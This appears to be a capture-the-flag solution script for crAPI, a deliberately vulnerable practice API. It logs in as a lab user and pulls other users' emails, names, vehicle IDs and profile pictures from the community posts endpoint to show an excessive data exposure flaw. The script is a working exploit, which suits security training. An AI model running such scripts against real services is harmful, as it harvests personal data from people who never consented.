#!/usr/bin/env python3
"""Challenge 4: Excessive Data Exposure - Community posts leak user data"""
import argparse, sys
from pathlib import Path
from typing import Optional, List, Dict, Any
import requests, yaml

def load_config(path: str) -> dict:
    with open(path, "r") as f:
        return yaml.safe_load(f)

def login(base_url: str, email: str, password: str, timeout: float = 15) -> Optional[str]:
    try:
        r = requests.post(f"{base_url.rstrip('/')}/identity/api/auth/login",
                         json={"email": email, "password": password}, timeout=timeout)
        return r.json().get("token") or r.json().get("access_token")
    except:
        return None

def get_recent_posts(base_url: str, token: str, timeout: float = 15) -> List[Dict[str, Any]]:
    headers = {"Authorization": f"Bearer {token}"}
    try:
        return requests.get(f"{base_url.rstrip('/')}/community/api/v2/community/posts/recent",
                           headers=headers, timeout=timeout).json().get("posts") or []
    except:
        return []

def main():
    parser = argparse.ArgumentParser(description="Challenge 4: Excessive Data Exposure")
    parser.add_argument("--config", default="../crapi_config.yaml")
    parser.add_argument("--user-email", default="mike1@my.lab")
    args = parser.parse_args()

    cfg = load_config(Path(args.config))
    base_url = cfg["target"]["base_url"]
    password = cfg["known_users"]["password"]

    print(f"[*] Challenge 4: Excessive Data Exposure\n[*] Target: {base_url}\n" + "-"*60)

    token = login(base_url, args.user_email, password)
    if not token:
        print("[!] Login failed"); sys.exit(1)
    print("[+] Logged in")

    posts = get_recent_posts(base_url, token)
    if not posts:
        print("[!] No posts found"); sys.exit(1)

    print(f"\n[*] Leaked data in /community/api/v2/community/posts/recent:")
    print("-"*60)

    for i, post in enumerate(posts[:5]):
        author = post.get("author") or {}
        print(f"\n[Post {i+1}]")
        print(f"  Email: {author.get('email')}")
        print(f"  Name: {author.get('nickname')}")
        print(f"  Vehicle ID: {author.get('vehicleid')}")
        print(f"  Profile Pic: {author.get('profile_pic_url')}")

    print(f"\n[!] VULNERABLE: Excessive Data Exposure")
    print(f"[!] The endpoint leaks other users' emails, names, vehicle IDs, and profile pics")

if __name__ == "__main__":
    main()
